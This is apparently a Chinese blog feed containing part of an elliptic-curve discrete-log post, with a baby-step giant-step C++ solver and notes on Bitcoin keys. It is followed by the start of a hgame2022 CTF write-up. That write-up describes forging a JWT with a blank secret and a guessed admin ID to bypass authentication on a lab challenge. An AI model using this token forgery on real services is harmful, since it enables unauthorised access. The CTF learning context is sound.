p:=604462909807314587353111;a:=-3;b:=95;</pre></td></tr><tr><td data-num="102"></td><td><pre>n:= 604462909807750541909849;r:=n;</pre></td></tr><tr><td data-num="103"></td><td><pre>P:=(428432040100075198254744, 95025782588400118295756);</pre></td></tr><tr><td data-num="104"></td><td><pre>R:=(472138605558837378507194, 138148835226095728614736);</pre></td></tr><tr><td data-num="105"></td><td><pre></pre></td></tr><tr><td data-num="106"></td><td><pre>(20) p:= 39614081257132168796771975177; a:=-3;b:=562;</pre></td></tr><tr><td data-num="107"></td><td><pre>n:= 39614081257132147751873462213;r:=n;</pre></td></tr><tr><td data-num="108"></td><td><pre>P:=(39220344157117715096559716859 , 3087260393566610895498596606);</pre></td></tr><tr><td data-num="109"></td><td><pre>R:=( 13160703755766149325136222951 , 6533567029273948676370251736);</pre></td></tr><tr><td data-num="110"></td><td><pre></pre></td></tr><tr><td data-num="111"></td><td><pre>(21) p:= 2596148429267413814265248164610099; a:=-3;b:=171;</pre></td></tr><tr><td data-num="112"></td><td><pre>n:= 2596148429267413788194246433592681;r:=n;</pre></td></tr><tr><td data-num="113"></td><td><pre>P:=(177627746966506201527866528484813 , 1735330667419561032038559795836927);</pre></td></tr><tr><td data-num="114"></td><td><pre>R:=( 1575178132453901115471501570466697, 538238983595050290992251454098891);</pre></td></tr><tr><td data-num="115"></td><td><pre></pre></td></tr><tr><td data-num="116"></td><td><pre>(22) p:= 170141183460469231731687303715884105757; a:=-3;b:=33;</pre></td></tr><tr><td data-num="117"></td><td><pre>n:= 170141183460469231728561996679834270597; r:=n;</pre></td></tr><tr><td data-num="118"></td><td><pre>P:=( 96152442714630401692673834213524521597 , 58626340067602219522071225434282008266);</pre></td></tr><tr><td data-num="119"></td><td><pre>R:=( 47795192678737921133501161460114957836 , 166078919686417913546029950371468891352);</pre></td></tr></table></figure><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 大步小步法对离散问题</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span> </span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">mo</span> <span class="token expression"><span class="token number">211108170305887LL</span> </span><span class="token comment">// 模数</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">a</span> <span class="token expression"><span class="token number">0LL</span></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">b</span> <span class="token expression"><span class="token number">7LL</span></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">x</span> <span class="token expression">first</span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">y</span> <span class="token expression">second</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre>using namespace std<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>using LL<span class="token operator">=</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">Point</span> <span class="token expression">pair<span class="token operator">&lt;</span> LL<span class="token punctuation">,</span>LL <span class="token operator">></span></span></span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>Point P<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">47815642535808LL</span><span class="token punctuation">,</span> <span class="token number">116240163507508LL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>Point R<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">77983503452527LL</span><span class="token punctuation">,</span> <span class="token number">143728424564583LL</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>Point inv<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>LL ans<span class="token punctuation">,</span>block<span class="token punctuation">,</span>sz<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>map<span class="token operator">&lt;</span>Point<span class="token punctuation">,</span>LL<span class="token operator">></span> M<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>LL <span class="token function">mul</span><span class="token punctuation">(</span>LL p<span class="token punctuation">,</span>LL q<span class="token punctuation">)</span> <span class="token comment">// 快速乘模</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	p<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">%</span>mo<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">,</span>q<span class="token operator">=</span><span class="token punctuation">(</span>q<span class="token operator">%</span>mo<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">*</span>q<span class="token operator">-</span><span class="token punctuation">(</span>LL<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>p<span class="token operator">/</span>mo<span class="token operator">*</span>q<span class="token operator">+</span><span class="token number">1e-6</span><span class="token punctuation">)</span><span class="token operator">*</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>LL <span class="token function">quick_power</span><span class="token punctuation">(</span>LL p<span class="token punctuation">,</span> LL q<span class="token punctuation">)</span>  <span class="token comment">// 快速幂</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	LL res<span class="token operator">=</span><span class="token number">1LL</span><span class="token punctuation">,</span>base<span class="token operator">=</span>p<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	<span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span>q<span class="token operator">&amp;</span><span class="token number">1LL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>			res<span class="token operator">=</span><span class="token function">mul</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>		base<span class="token operator">=</span><span class="token function">mul</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>		q<span class="token operator">>>=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	<span class="token keyword">return</span> res<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>Point <span class="token function">Point_square</span><span class="token punctuation">(</span>Point Q<span class="token punctuation">)</span>  <span class="token comment">// 点的平方</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>	Point P<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>	LL tmp<span class="token operator">=</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3LL</span><span class="token operator">*</span><span class="token function">mul</span><span class="token punctuation">(</span>Q<span class="token punctuation">.</span>x<span class="token punctuation">,</span>Q<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token operator">+</span>a<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">,</span><span class="token function">quick_power</span><span class="token punctuation">(</span><span class="token number">2LL</span><span class="token operator">*</span>Q<span class="token punctuation">.</span>y<span class="token operator">%</span>mo<span class="token punctuation">,</span>mo<span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>	P<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2LL</span><span class="token operator">*</span>Q<span class="token punctuation">.</span>x<span class="token operator">%</span>mo<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>	P<span class="token punctuation">.</span>y<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token punctuation">(</span>Q<span class="token punctuation">.</span>x<span class="token operator">-</span>P<span class="token punctuation">.</span>x<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">)</span><span class="token operator">-</span>Q<span class="token punctuation">.</span>y<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>	<span class="token keyword">return</span> P<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>Point <span class="token function">Point_mul</span><span class="token punctuation">(</span>Point P<span class="token punctuation">,</span> Point Q<span class="token punctuation">)</span>  <span class="token comment">// 点的乘积</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span>P<span class="token operator">==</span>Q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>		<span class="token keyword">return</span> <span class="token function">Point_square</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>	Point res<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>	LL tmp<span class="token operator">=</span><span class="token function">mul</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Q<span class="token punctuation">.</span>y<span class="token operator">-</span>P<span class="token punctuation">.</span>y<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">,</span><span class="token function">quick_power</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Q<span class="token punctuation">.</span>x<span class="token operator">-</span>P<span class="token punctuation">.</span>x<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">,</span>mo<span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>	res<span class="token punctuation">.</span>x<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span>Q<span class="token punctuation">.</span>x<span class="token operator">+</span>mo<span class="token operator">-</span>P<span class="token punctuation">.</span>x<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>	res<span class="token punctuation">.</span>y<span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">mul</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span><span class="token punctuation">(</span>P<span class="token punctuation">.</span>x<span class="token operator">-</span>res<span class="token punctuation">.</span>x<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">)</span><span class="token operator">-</span>P<span class="token punctuation">.</span>y<span class="token operator">+</span>mo<span class="token punctuation">)</span><span class="token operator">%</span>mo<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>	<span class="token keyword">return</span> res<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre>Point <span class="token function">Point_quick_power</span><span class="token punctuation">(</span>Point p<span class="token punctuation">,</span> LL q<span class="token punctuation">)</span>  <span class="token comment">// 点的快速幂</span></pre></td></tr><tr><td data-num="58"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>	Point res<span class="token operator">=</span>p<span class="token punctuation">,</span>base<span class="token operator">=</span>p<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>	<span class="token operator">--</span>q<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>	<span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="62"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span>q<span class="token operator">&amp;</span><span class="token number">1LL</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre>			res<span class="token operator">=</span><span class="token function">Point_mul</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>		base<span class="token operator">=</span><span class="token function">Point_mul</span><span class="token punctuation">(</span>base<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>		q<span class="token operator">>>=</span><span class="token number">1LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="68"></td><td><pre>	<span class="token keyword">return</span> res<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="70"></td><td><pre></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="73"></td><td><pre>	Point PP<span class="token operator">=</span>P<span class="token punctuation">,</span>QQ<span class="token operator">=</span>R<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="74"></td><td><pre>	block<span class="token operator">=</span><span class="token function">LL</span><span class="token punctuation">(</span><span class="token function">sqrtl</span><span class="token punctuation">(</span>mo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10LL</span><span class="token punctuation">;</span>  <span class="token comment">// 定义分块个数，乘以 10 是一个内存限制的体现</span></pre></td></tr><tr><td data-num="75"></td><td><pre>	sz<span class="token operator">=</span><span class="token punctuation">(</span>mo<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>block<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// 求出块的大小</span></pre></td></tr><tr><td data-num="76"></td><td><pre>	inv<span class="token operator">=</span><span class="token function">Point_quick_power</span><span class="token punctuation">(</span>P<span class="token punctuation">,</span>sz<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//P^-sz</span></pre></td></tr><tr><td data-num="77"></td><td><pre>	inv<span class="token punctuation">.</span>y<span class="token operator">=</span>mo<span class="token operator">-</span>inv<span class="token punctuation">.</span>y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="78"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>sz<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="80"></td><td><pre>		M<span class="token punctuation">[</span>PP<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="81"></td><td><pre>		PP<span class="token operator">=</span><span class="token function">Point_mul</span><span class="token punctuation">(</span>PP<span class="token punctuation">,</span>P<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="82"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="83"></td><td><pre>	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>M<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="84"></td><td><pre>	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>block<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="85"></td><td><pre>	<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="86"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token punctuation">(</span>block<span class="token operator">/</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="88"></td><td><pre>		<span class="token keyword">if</span><span class="token punctuation">(</span>M<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>QQ<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">// 找到碰撞，求出答案</span></pre></td></tr><tr><td data-num="89"></td><td><pre>		<span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="90"></td><td><pre>			<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lld"</span><span class="token punctuation">,</span>i<span class="token operator">*</span>sz<span class="token operator">+</span>M<span class="token punctuation">[</span>QQ<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="91"></td><td><pre>			<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="92"></td><td><pre>		<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="93"></td><td><pre>		QQ<span class="token operator">=</span><span class="token function">Point_mul</span><span class="token punctuation">(</span>QQ<span class="token punctuation">,</span>inv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 求出新的 QQ</span></pre></td></tr><tr><td data-num="94"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="95"></td><td><pre>	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="96"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>大概四分钟跑出来了，还是第一组的第一个数据，可想而知第 22 个数据需要跑多久了了。这也正正体现了离散对数中求 k 的困难型，成本十分巨大。</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/31/cbe3e6e121980ee7.png" alt="" /></p>
<h3 id="bitcoin"><a class="anchor" href="#bitcoin">#</a> Bitcoin</h3>
<p>⼀个⽐特币钱包中包含⼀系列的密钥对， 每个密钥对包括⼀个私钥和⼀个公钥。 私钥 k 是⼀个数字， 通常是随机选出的。</p>
<p>⽐特币⽹络中的所有⼈都可以通过所提交的公钥和签名进⾏验证， 并确认该交易是否有效， 即确认⽀付者在该时刻对所交易的⽐特币拥有所有权。（⼤多数⽐特币钱包⼯具为了⽅便会将私钥和公钥以密钥对的形式存储在⼀起。 然⽽， 公钥可以由私钥计算得到， 所以只存储私钥也是可以的。</p>
<p>公钥和私钥之间的数学关系， 使得私钥可⽤于⽣成特定消息的签名。 此签名可以在不泄露私钥的同时对公钥进⾏验证。</p>
<p>公钥⽤于接收⽐特币， ⽽私钥⽤于⽐特币⽀付时的交易签名。</p>
<p>⽀付⽐特币时， ⽐特币的当前所有者需要在交易中提交其公钥和签名（ 每次交易的签名都不同， 但均从同⼀个私钥⽣成）</p>
<p>有了私钥， 我们就可以使⽤椭圆曲线乘法这个单向加密函数产⽣⼀个公钥 K . 有了公钥 K ， 我们就可以使⽤⼀个单向加密哈希函数⽣成⽐特币地址 A 。</p>
<p>⽐特币使⽤了 secp256k1 标准所定义的⼀条特殊的椭圆曲线和⼀系列数学常数。</p>
<p>私钥 k</p>
<figure class="highlight markdown"><figcaption data-lang="markdown"></figcaption><table><tr><td data-num="1"></td><td><pre>1E99423A4ED27608A15A2616A2B0E9E52CED330AC530EDCC32C8FFC6A526AEDD</pre></td></tr></table></figure><p>生成公钥</p>
<figure class="highlight markdown"><figcaption data-lang="markdown"></figcaption><table><tr><td data-num="1"></td><td><pre>&#123;K = k <span class="token italic"><span class="token punctuation">*</span><span class="token content"> G&#125;</pre></td></tr><tr><td data-num="2"></td><td><pre># K = 1E99423A4ED27608A15A2616A2B0E9E52CED330AC530EDCC32C8FFC6A526AEDD </span><span class="token punctuation">*</span></span> G</pre></td></tr></table></figure><h3 id="ec-elgamal"><a class="anchor" href="#ec-elgamal">#</a> EC ElGamal</h3>
<p>EC ElGamal 是 ECC 的一种，把 ElGamal 移植到椭圆曲线上来实现</p>
<p>AND 一些其他问题，这里就不一一列出了，个人能力也十分有限等学到后再补上。</p>
<p>如果您觉得有所收获的话，还希望不要吝啬您的赞，也欢迎您请我喝奶茶哦</p>
<p>参考：</p>
<pre><code class="language-text">颜松远，椭圆曲线[M]，大连理工大学出版社，2011.05
杨波，现代密码学(第4版)[M]，清华大学出版社，2017.07
[1] Hankerson D., Menezes A.J.,Vanstone S.: Guide to Elliptic Curve Cryptography. 
Springer, Heidelberg (2004)
[2] Bailey D., Batina L., Bernstein D.J., Birkner P., Bos J.W., et al .: Breaking 
ECC2K-130. Cryptology ePrint Archive, Report 2009/541 (2009)
[3] Smart N.P.: The discrete logarithm problem on elliptic curves of trace one. J. 
Cryptol. 12, 193-196 (1999)
[4] Menezes A.J., Okamoto T., Vanstone S.A.: Reducing elliptic curve logarithms to 
logarithms in a finite field. IEEE Trans. Inf. Theory. 39(5), 1639 -1646 (1993)

</code></pre>
]]></content>
      <categories>
        <category>数论</category>
        <category>Math</category>
      </categories>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame2022</title>
    <url>/hgame2/</url>
    <content><![CDATA[<hr />
<p>这次 hgame 几乎都是靠写一些脚本跑出几道简单的密码题来得分，想学习 web 却无从下手；<br />
<a id="more"></a></p>
<h1 id="web"><a class="anchor" href="#web">#</a> Web</h1>
<h2 id="easy_auth"><a class="anchor" href="#easy_auth">#</a> easy_auth</h2>
<p>查看 wp 才会</p>
<p>这是关于鉴权方面的问题。</p>
<p>鉴权（authentication）是指验证用户是否拥有访问系统的权利。传统的鉴权是通过密码来验证的。这种方式的前提是，每个获得密码的用户都已经被授权。在建立用户时，就为此用户分配一个密码，用户的密码可以由管理员指定，也可以由用户自行申请。这种方式的弱点十分明显：一旦密码被偷或用户遗失密码，情况就会十分麻烦，需要管理员对用户密码进行重新修改，而修改密码之前还要人工验证用户的合法身份。</p>
<p>为了克服这种鉴权方式的缺点，需要一个更加可靠的鉴权方式。目前的主流鉴权方式是利用认证授权来验证数字签名的正确与否。</p>
<p>逻辑上，授权发生在鉴权之后，而实际上，这两者常常是一个过程。</p>
<p>我们常用的鉴权有四种：</p>
<p>1、HTTP Basic Authentication</p>
<p>2、session-cookie</p>
<p>3、Token 验证</p>
<p>4、OAuth (开放授权)</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NpbmF0XzMzMjU1NDk1L2FydGljbGUvZGV0YWlscy8xMDM5MjAxMzE=">详情参考</span></p>
<p>这题是用的 Token 验证<br />
认证过程:</p>
<ul>
<li>用户输入登陆凭据；</li>
<li>服务器验证凭据是否正确，然后返回一个经过签名的 token；</li>
<li>客户端负责存储 token，可以存在 localstorage，或者 cookie 中</li>
<li>对服务器的请求带上这个 token；</li>
<li>服务器对 JWT 进行解码，如果 token 有效，则处理该请求；</li>
<li>一旦用户登出，客户端销毁 token。</li>
</ul>
<p>我们先找到必需的 token 之后在对他进行<span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8vI2RlYnVnZ2Vy"> JWT 解码</span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/02/632baecfe53e17d5.png" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/02/af400a1d0b00429d.png" alt="" /><br />
需要密码的部分清空，这题不需要密码</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/02/5e34d12e1f2c7a5d.png" alt="" /><br />
利用题目已知的 admin，猜测 ID，得到 flag 的 token</p>
<p>替换原来的 token，不用多久就会显现 flag<br />
<img data-src="https://s3.bmp.ovh/imgs/2022/02/51d181fc71c60dfa.png" alt="" /></p>
<h2 id="蛛蛛嘿嘿我的蛛蛛"><a class="anchor" href="#蛛蛛嘿嘿我的蛛蛛">#</a> 蛛蛛... 嘿嘿♥我的蛛蛛</h2>
<p>爬虫爬<br />
这里用正则更快一点<br />
 payload</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> re</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>next_url <span class="token operator">=</span> base <span class="token operator">=</span> <span class="token string">'https://hgame-spider.vidar.club/xxxx'</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#page_text = requests.get (url=next_url,headers=headers).text #使用通用爬虫对 url 对应的一张页面进行爬取</span></pre></td></tr><tr><td data-num="9"></td><td><pre>ex <span class="token operator">=</span> <span class="token string">'&lt;a href=\"(\S+)\">点我试试&lt;/a>'</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    keys <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>ex<span class="token punctuation">,</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token keyword">break</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    next_url <span class="token operator">=</span> base <span class="token operator">+</span> keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment">#print(next_url)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span><span class="token punctuation">.</span>headers<span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="webpack-engine"><a class="anchor" href="#webpack-engine">#</a> webpack-engine</h2>
<p>JavaScript 脚本正变得越来越复杂。大部分源码（尤其是各种函数库和框架）都要经过转换，才能投入生产环境。<br />
常见的源码转换，主要是以下三种情况：</p>
<p>1）压缩，减小体积。比如 jQuery 1.9 的源码，压缩前是 252KB，压缩后是 32KB。<br />
2）多个文件合并，减少 HTTP 请求数。<br />
